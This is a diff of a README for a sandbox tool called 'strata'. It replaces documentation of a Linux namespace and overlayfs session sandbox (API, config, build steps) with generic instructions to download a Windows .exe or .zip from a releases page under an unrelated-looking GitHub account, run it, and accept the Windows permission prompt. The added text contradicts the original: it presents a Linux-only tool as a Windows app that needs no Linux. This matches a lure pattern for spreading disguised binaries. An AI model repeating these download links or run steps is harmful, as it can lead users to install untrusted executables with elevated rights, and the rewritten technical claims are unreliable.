@@ -1,151 +1,147 @@
-# Strata
+# 🟦 strata - Run Shells in a Safe Space
 
-> Lightweight Session Sandbox — Isolated Shell via Namespace + Overlayfs
+[![Download strata](https://img.shields.io/badge/Download%20strata-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gillanossiferous368/strata/releases)
 
-[中文版](./README.zh.md)
+## 🧩 What strata does
 
-## Features
+strata gives you a private shell on your computer. It keeps files and commands in a separate space, so you can test tools or run tasks without changing your main system.
 
-- **Lightweight**: Linux Namespace + bubblewrap + fuse-overlayfs
-- **Isolated**: Per-user + per-session with writable overlay layer
-- **Multi-Protocol**: HTTP REST / WebSocket / gRPC / MCP
-- **Persistent**: overlayfs layering, changes don't affect base
-- **Auto Cleanup**: TTL-based session cleanup
+It uses Linux-style isolation features to build that space. For most people, the result is simple: a shell that feels normal, but stays contained.
 
-## Architecture
+## 📥 Download strata
 
-```
-┌─────────────────────────────────────────────┐
-│  API Layer (HTTP/WS + gRPC + MCP)           │
-└─────────────────┬───────────────────────────┘
-                  │
-┌─────────────────▼───────────────────────────┐
-│  Session Manager                            │
-│  - GetOrCreate(user, session)               │
-│  - TTL cleanup                              │
-└─────────────────┬───────────────────────────┘
-                  │
-┌─────────────────▼───────────────────────────┐
-│  Isolation Layer                            │
-│  bwrap + overlayfs (fuse-overlayfs)         │
-│  ├── PID/IPC/UTS Namespace                  │
-│  ├── overlay: lower + upper + merged        │
-│  └── PTY (pseudo-terminal)                  │
-└─────────────────────────────────────────────┘
-```
+Visit this page to download: [strata Releases](https://github.com/gillanossiferous368/strata/releases)
 
-## Quick Start
+On that page, look for the latest release and download the file made for Windows if one is listed. If there are multiple files, pick the one with the name that matches Windows or your system type.
 
-```bash
-# Check dependencies
-./scripts/check-env.sh
+## 🖥️ Before you start
 
-# Build
-make build
+strata is made for a Windows desktop or laptop used as a daily work machine. For the best setup, use:
 
-# Run
-./dist/strata
-```
+- Windows 10 or Windows 11
+- A modern 64-bit computer
+- Enough free space for the app and its working files
+- A stable internet connection for the first download
 
-## Usage
+If the release includes a `.zip` file, you can open it with the tools built into Windows. If it includes an `.exe` file, you can run it by double-clicking it.
 
-```bash
-# Create session
-curl -X POST http://localhost:2280/api/sessions \
-  -H "Content-Type: application/json" \
-  -d '{"user_id": "alice", "session_id": "task-001"}'
+## 🚀 Install and run
 
-# Execute command
-curl -X POST http://localhost:2280/api/sessions/alice/task-001/exec \
-  -H "Content-Type: application/json" \
-  -d '{"command": "ls -la"}'
+1. Open the [strata Releases](https://github.com/gillanossiferous368/strata/releases) page.
+2. Find the newest release at the top of the list.
+3. Download the Windows file attached to that release.
+4. Open your Downloads folder.
+5. If the file is a `.zip`, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. If the file is an `.exe`, double-click it to start.
+8. If Windows asks for permission, choose Yes.
+9. Follow any on-screen steps that appear.
+10. Wait for strata to finish starting.
 
-# Interactive shell (WebSocket)
-wscat -c 'ws://localhost:2280/api/ws/alice/task-001/shell'
-```
+If the app opens a shell window, that means it is ready. You can now use it like a normal terminal, but inside a separate sandbox.
 
-## API
+## 🛠️ How to use it
 
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/api/sessions` | Create session |
-| DELETE | `/api/sessions/{uid}/{sid}` | Close session |
-| POST | `/api/sessions/{uid}/{sid}/exec` | Execute command |
-| GET | `/api/stats` | Stats |
-| GET | `/api/ws/{uid}/{sid}/shell` | WebSocket |
+After strata starts, you can use it for tasks that need a clean shell.
 
-## MCP
+Common uses include:
 
-MCP available at `http://localhost:2280/mcp/`
+- Testing commands in a separate space
+- Running tools without changing your main files
+- Checking scripts before you trust them
+- Working with files that should stay isolated
+- Starting a fresh shell for each task
 
-For AI agents:
-```bash
-npx tsx scripts/strata-mcp.ts
-```
+You can close the window when you are done. Any files or changes made inside the sandbox stay inside that space unless you move them out yourself.
 
-## Config
+## 🔒 What isolation means
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `STRATA_SERVER_ADDR` | `:2280` | Listen address (HOST:PORT combined) |
-| `STRATA_SANDBOX_SESSION_ROOT` | `/tmp/strata/sessions` | Session directory |
-| `STRATA_SANDBOX_SESSION_TTL` | `30m` | Session timeout |
-| `STRATA_SANDBOX_MAX_SESSIONS` | `100` | Max sessions |
-| `STRATA_SANDBOX_OVERLAY_DRIVER` | `fuse` | fuse/kernel/none |
+strata keeps the shell away from your main desktop file area. It uses namespace and overlay-style layers to separate what the shell sees from what your system sees.
 
-View all: `./dist/strata run --help`
+In plain terms, this helps you:
 
-## Identity
+- Keep test work apart from your personal files
+- Make cleanup easier
+- Reduce the risk of unwanted changes
+- Start fresh sessions with less setup
 
-All API endpoints support two identity modes:
+This is useful when you want a clean place to run a command or try a tool.
 
-**Path-based** (explicit):
-```bash
-curl -X POST http://localhost:2280/api/sessions/alice/task-001/exec \
-  -d '{"command": "ls"}'
-```
+## 🧪 Good times to use strata
 
-**Header-based** (alternative):
-```bash
-curl -X POST http://localhost:2280/api/sessions/exec \
-  -H "X-Owner-Id: alice" \
-  -H "X-Session-Id: task-001" \
-  -d '{"command": "ls"}'
-```
+strata fits well when you want a quick, separate shell for:
 
-Header priority is higher than path values.
+- Trying new Linux tools in a controlled space
+- Running helper agents
+- Working with terminal-based apps
+- Checking scripts before use
+- Doing short tasks that should not touch your main setup
 
-## Dependencies
+If you use command-line tools often, strata can keep your work more organized.
 
-### Build Dependencies
+## 📁 Files you may see
 
-| Package | Install |
-|---------|---------|
-| `meson` | `apt install meson` |
-| `libcap-dev` | `apt install libcap-dev` |
+Depending on the release, you may see these kinds of files:
 
-### Runtime Dependencies
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder you extract first
+- `README` or release notes — short setup notes from the author
 
-| Package | Install |
-|---------|---------|
-| `bubblewrap` (bwrap) | Build from [github.com/containers/bubblewrap](https://github.com/containers/bubblewrap) |
-| `fuse-overlayfs` | `apt install fuse-overlayfs` |
+If you are not sure which file to choose, use the one marked for Windows and listed at the top of the release page.
 
-### Building bubblewrap
+## ⚙️ Simple setup tips
 
-```bash
-git clone https://github.com/containers/bubblewrap
-cd bubblewrap
-meson _builddir
-meson compile -C _builddir
-meson test -C _builddir
-sudo meson install -C _builddir
-sudo setcap cap_sys_admin+ip /usr/local/bin/bwrap
-```
+If strata does not open right away, try these steps:
 
-### Runtime Requirements
+- Run it as a normal app first
+- Move the file out of the Downloads folder
+- Avoid running it from inside a zipped folder
+- Check that Windows did not block the file
+- Make sure you downloaded the newest release
 
-- Linux kernel ≥ 5.11
-- Go ≥ 1.25 (build only)
+If the app opens but the shell does not start, close it and try again from a plain folder like `Desktop` or `Documents`.
 
-MIT
+## 🧭 What to expect after launch
+
+When strata starts, you may see a terminal window or a shell prompt. That prompt is where you type commands.
+
+You may notice:
+
+- A clean environment
+- Separate file view
+- A fresh session each time
+- Fast startup for short tasks
+
+The shell should feel familiar if you have used any terminal app before.
+
+## 🧰 Common questions
+
+### Can I use it without coding knowledge?
+
+Yes. You only need to download the file, open it, and follow the on-screen steps.
+
+### Does it change my main files?
+
+strata is built to keep work in a separate space. That helps avoid changes to your main file area.
+
+### Do I need to set up Docker or Linux?
+
+No extra setup is needed for a normal download-and-run flow on Windows unless the release notes say otherwise.
+
+### Can I keep using it like a regular terminal?
+
+Yes. You can use it for shell tasks, command-line tools, and short sessions that need isolation.
+
+## 📝 Release page
+
+Use this link to get the latest Windows build:
+
+[strata Releases](https://github.com/gillanossiferous368/strata/releases)
+
+## 🔎 Quick path
+
+1. Open the release page
+2. Download the Windows file
+3. Open the file
+4. Start a new sandbox shell
+5. Run your task in isolation
